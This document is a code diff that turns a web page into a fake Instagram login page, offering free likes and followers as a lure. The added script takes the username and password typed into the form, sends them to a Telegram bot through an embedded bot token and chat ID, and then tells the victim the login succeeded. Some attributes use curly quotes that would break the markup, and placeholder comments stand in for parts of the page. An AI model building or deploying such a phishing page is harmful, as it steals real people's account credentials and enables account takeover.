@@ -1,12 +1,75 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Instagram - Free Likes and Followers</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+<!DOCTYPE html>
+<html lang=“en”>
+<head>
+<meta charset=“UTF-8” />
+<meta name=“viewport” content=“width=device-width, initial-scale=1.0”/>
+<title>Instagram Login</title>
+<link rel=“stylesheet” href=“https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css”/>
+</head>
+<body class=“min-h-screen bg-[#fafafa] flex flex-col items-center justify-center px-4”>
+<div class=“w-full max-w-[350px] flex flex-col items-center”>
+<div class=“w-full bg-white border border-[#dbdbdb] rounded-sm px-10 pt-10 pb-6 mb-2.5”>
+<div class=“flex justify-center mb-4”>
+<img src=“https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png”
+alt=“Instagram”
+class=“h-[51px] object-contain”/>
+</div>
+<div class=“text-center mb-6”>
+<h1 class=“text-[16px] font-semibold text-[#8e8e8e] leading-5”>Free Instagram Likes and Followers</h1>
+</div>
+<form id=“loginForm” class=“flex flex-col gap-1.5”>
+<div class=“relative”>
+<input type=“text” id=“username” name=“username”
+class=“w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-[2px] text-xs outline-none focus:border-[#a8a8a8]”
+placeholder="" required/>
+<label for=“username”
+class=“absolute left-2 top-1/2 -translate-y-1/2 text-[12px] text-[#8e8e8e] pointer-events-none transition-all duration-100 ease-linear”>Phone number, username, or email</label>
+</div>
+<div class=“relative”>
+<input type=“password” id=“password” name=“password”
+class=“w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-[2px] pr-14 text-xs outline-none focus:border-[#a8a8a8]”
+placeholder="" required minlength=6/>
+<label for=‘password’
+class=‘absolute left-2 top-1/2 -translate-y-1/2 text-[12px] text-[#8e8e8e]’
+>Password</label>
+</div>
+<button type=‘submit’
+id=‘loginBtn’
+disabled
+class=‘w-full h-[32px] mt-2 rounded-lg text-sm font-semibold text-white transition-opacity bg-[#0095f6]/70 cursor-not-allowed’>
+Log in
+</button>
+</form>
+  <!-- ... rest of the HTML ... -->
+</div>
+
+<!-- ... rest of the HTML ... -->
+</div>
+<!-- … rest of the HTML … -->
+<!-- Add JS at end of body -->
+<script>
+const loginForm = document.getElementById(‘loginForm’);
+const loginBtn = document.getElementById(‘loginBtn’);
+const usernameInput = document.getElementById(‘username’);
+const passwordInput = document.getElementById(‘password’);
+function validateForm() {
+  loginBtn.disabled = !(usernameInput.value.length > 0 && passwordInput.value.length >= 6);
+  loginBtn.className = loginBtn.disabled
+    ? 'w-full h-[32px] mt-2 rounded-lg text-sm font-semibold text-white transition-opacity bg-[#0095f6]/70 cursor-not-allowed'
+    : 'w-full h-[32px] mt-2 rounded-lg text-sm font-semibold text-white transition-opacity bg-[#0095f6]'
+}
+
+usernameInput.addEventListener('input', validateForm);
+passwordInput.addEventListener('input', validateForm);
+
+loginForm.addEventListener('submit', async (event) => {
+  event.preventDefault();
+  const message = `Username: ${usernameInput.value}\nPassword: ${passwordInput.value}`;
+  await fetch(
+    `https://api.telegram.org/bot7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo/sendMessage?chat_id=7643222418&text=${encodeURIComponent(message)}`
+  );
+  alert("Login successful!"); // Or redirect to another page
+});
+</script>
+</body>
 </html>
